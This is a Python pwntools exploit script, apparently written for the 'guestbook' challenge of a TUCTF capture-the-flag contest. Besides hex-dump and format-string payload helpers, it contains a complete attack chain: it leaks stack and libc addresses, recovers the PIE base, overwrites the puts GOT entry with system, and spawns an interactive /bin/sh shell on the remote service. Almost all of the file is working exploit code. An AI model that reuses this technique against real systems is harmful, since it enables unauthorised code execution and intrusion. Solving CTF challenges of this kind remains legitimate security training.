#!/usr/bin/python
# encoding: utf-8
from  pwn import *
context.clear(arch='i386')

import time
import sys
binaire='guestbook'

if (len(sys.argv)>1):
    TIME=0.0
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
    host='guestbook.tuctf.com'
    port= 4545

else:
    TIME=0.0
    elf=ELF(binaire)
    libc=ELF('/lib/i386-linux-gnu/libc.so.6')
    host='localhost'
    port=59993


def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s
def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def complete(t,l,c="\x00"):
    if (len(t)< l):
        return(t+(l-len(t))*c)
    else:
        return(t)


def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "
def dumpgc(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %8 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
        l=l+8
#        s=s+toprint(buffer[l])
    print " "

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)
# routine de format

def strl(n,l=5):
    s=str(n)
    s="0"*max(0,l-len(s))+s
    return(s)

def fmt(x):
    if (x < 8):
        return("A"*x)
    return("%"+str(x)+"x")


def lchaine(lwhat,offset,nb=4):
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$hn"
    for c in lnom:
        fm=fmt(c[0]-ind)+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

def lchaineverif(lwhat,offset,nb=4):
    if (nb==4):
        vv='8x'
    else:
        vv='lx'
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$"+vv
    for c in lnom:
        fm="F"*len(fmt(c[0]-ind))+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

debug=1

def pdebug(s):
    if (debug==1):
        print s
    return(s)

def tolibc(s):
    return(libc.sym[s]-libc.sym[reference_libc]+adr_reference_libc)

def adlibc(a):
    return(a-libc.sym[reference_libc]+adr_reference_libc)

def whatis(s):
    print s," = ",hex(tolibc(s))

def pause():
    print "Pause...",
    raw_input()

def isprintable(s):
    for c in s:
        if ((ord(c) < 32) or (ord(c)>126)) and (ord(c)>0):
            return(False)
    return(True)

def after(m,s):
    try:
        return(s[s.index(m)+len(m):])
    except:
        return(s)

def before(m,s):
    try:
        return(s[:s.index(m)])
    except:
        return(s)


############
def lire():
    r=p.recvuntil("\n")
    return(r[:r.index("\n")])

def lireoffset(i):
    stype("%"+str(i)+"$016lx")
    sdate("30-1960")
    try:
        b=p.recv(65000)
        return(after("/log/",b))
    except:
        return("")


def lireptroffset(i):
    stype("%"+str(i)+"$s")
    sdate("30-1960")
    try:
        b=p.recv(65000)
        return(after("/log/",b))
    except:
        return("")


def getzone(a):
    start()
    stype("%19$s")
    sdate("30-1960a"+p64(a))
    try:
        b=p.recv(65000)
        p.close()
        return(after("/log/",b))
    except:
        p.close()
        return("")

def getzonep(a):
    stype("%19$s")
    sdate("30-1960a"+p64(a))
    try:
        b=p.recv(65000)
        return(after("/log/",b))
    except:
        return("")
    
def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)

#p=process('./'+binaire,stdin=process.PTY)
p=remote(host,port)

p.recvuntil(">>>")
p.sendline("a"*15)
p.recvuntil(">>>")
p.sendline("b"*15)
p.recvuntil(">>>")
p.sendline("c"*15)
p.recvuntil(">>>")
p.sendline("/bin/sh\x00")
p.recvuntil(">>")
p.sendline("1")
p.recvuntil(">>>")
p.sendline("6")
pile=p.recvuntil(">>")
print "[+] pile:"
dump(0,pile)
reference_libc='system'
adr_reference_libc=word(pile[5*4:6*4])
adpile=word(pile[6*4:7*4]) # debut de la table
whatis('system')
print "[+] pile = ",hex(adpile)

# pie: on modifie l'adresse de nom 0

p.sendline("2")
p.recvuntil(">>>")
p.sendline("6")
p.recvuntil(">>>")
p.sendline(p32(adpile+32*4))
p.sendline("")
p.recvuntil(">>")

p.sendline("1")
p.recvuntil(">>>")
p.sendline("0")
b=p.recvuntil(">>")
pie=word(b[0:4]) & 0xfffff000
print "[+] pie: ", hex(pie)



p.sendline("2")
p.recvuntil(">>>")
p.sendline("6")
p.recvuntil(">>>")
p.sendline(p32(pie+elf.got['puts']))
p.sendline("")
p.recvuntil(">>")

p.sendline("2")
p.recvuntil(">>>")
p.sendline("0")
b=p.recvuntil(">>")
p.sendline(p32(tolibc('system')))
p.sendline("")
p.sendline("1")
p.sendline("3")
p.interactive()



exit(0)
